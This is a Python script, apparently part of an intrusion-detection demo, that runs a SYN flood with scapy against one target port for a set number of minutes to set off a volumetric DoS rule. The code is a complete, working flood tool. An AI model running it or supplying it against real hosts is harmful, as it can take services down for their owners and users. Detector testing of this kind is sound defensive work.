"""SYN flood against one port - high-volume stressor (optional 3rd act).

One-port SYN flood: extreme flow/packet counts on a single destination port.
Expected live behavior: pkts_total and bytes_total spike far past the training
p99, which trips the rule engine's volumetric DoS check; the LSTM alone does
NOT reliably cross on this shape (documented: the model's learned flood
profile comes from CIC's UDP-flood records, and single-port TCP flooding with
real SYN flags shifts features the model never saw nonzero). Run the UDP
sweep for the LSTM moment; run this for the volumetric moment.

  python syn_flood.py --target 192.168.1.20 --port 8080 --minutes 1
"""
from __future__ import annotations

import argparse
import random
import time

from scapy.all import IP, TCP, send


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--minutes", type=float, default=1.0)
    ap.add_argument("--batch", type=int, default=100,
                    help="SYNs per send() call (raw L3, no handshake state)")
    a = ap.parse_args()

    print(f"SYN flood -> {a.target}:{a.port}, batch={a.batch}")
    deadline = time.time() + a.minutes * 60
    n = 0
    while time.time() < deadline:
        pkts = [IP(dst=a.target) /
                TCP(sport=random.randint(1024, 65000), dport=a.port, flags="S") /
                ("X" * 16) for _ in range(a.batch)]
        send(pkts, verbose=0)
        n += a.batch
    print(f"sent ~{n} SYNs")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
